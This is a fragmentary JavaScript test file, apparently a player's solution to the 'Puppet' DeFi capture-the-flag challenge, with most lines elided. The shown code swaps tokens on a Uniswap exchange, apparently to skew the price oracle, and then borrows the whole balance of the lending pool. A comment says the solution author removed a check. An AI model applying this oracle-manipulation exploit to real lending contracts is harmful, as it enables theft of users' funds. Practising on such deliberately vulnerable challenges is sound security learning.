...
describe("[Challenge] Puppet", function () {
      ...
      .then(async (_) => {
        await uniswapExchange
          ...
          .tokenToEthSwapInput(
            ...
            (await ethers.provider.getBlock(ethers.provider.blockNumber)).timestamp + 1000
          );
        const tx = await lendingPool.connect(player);
        const requiredDeposit = await tx.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);

        await tx.borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
  ...
  after(async function () {
    ...
    // Not needed because it is not possible to execute it in one transaction | Removed by the solution creator not by the challenge creator.
